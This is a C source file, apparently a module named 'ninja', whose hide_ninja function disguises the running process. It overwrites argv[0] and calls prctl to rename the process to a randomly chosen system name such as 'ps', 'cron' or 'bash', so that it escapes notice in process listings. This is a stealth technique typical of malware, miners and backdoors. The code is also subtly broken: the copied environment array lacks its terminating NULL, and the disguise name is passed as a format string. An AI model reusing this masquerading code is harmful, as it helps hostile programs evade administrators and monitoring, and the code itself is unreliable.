#include "ninja.h"
#include <string.h>
#include <ctime>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <limits.h>
#include <sys/user.h>
#include <sys/prctl.h>

struct ninja_data
{
    int argv0size;
    int argc;
    char **argv;
};

struct ninja_data ninja;

extern char **environ;

void init_ninja(int argc, char **argv){
    ninja.argv = argv;
    ninja.argc = argc;
    ninja.argv0size = strlen(argv[0]);
    srand(time(NULL));
}

void hide_ninja(){
    int r;
    const char* title;

    r = rand()%6;

    switch(r){
    case 0:
        title = "ps";
        break;

    case 1:
        title = "cron";
        break;

    case 2:
        title = "bash";
        break;

    case 3:
        title = "/bin/cat";
        break;

    case 4:
        title = "ps";
        break;

    case 5:
        title = "ps";
        break;
    }
// title = "SSSSSSSSSSSSSSSSSSSSSSSSSSSSSimea";
    
    static unsigned int size = 0;
    if(!size){
        int env_len = -1;
        if (environ)
            while (environ[++env_len])
                ;

        if (env_len > 0)
            size = environ[env_len-1] + strlen(environ[env_len-1]) - ninja.argv[0];
        else
            size = ninja.argv[ninja.argc-1] + strlen(ninja.argv[ninja.argc-1]) - ninja.argv[0];

        if (environ)
        {

            char **new_environ = (char**)malloc(env_len*sizeof(char*));

            unsigned int i = -1;
            while (environ[++i])
                new_environ[i] = strdup(environ[i]);

            environ = new_environ;
        }
    }
    
    memset(ninja.argv[0], '\0', size);
    snprintf(ninja.argv[0], size - 1, title, size);

    prctl(PR_SET_NAME, (unsigned long) title, 0, 0, 0);
   // printf("Udalo sie %s \n", title);

}
/*
int main(int argc, char **argv)
{
    init_ninja(argc, argv);
    printf("start");

    hide_ninja();

//    if(!fork()) {
//        hide_ninja();
//    } else {
//        exit(0);
//    }




    while(1)
    {
    }
} */
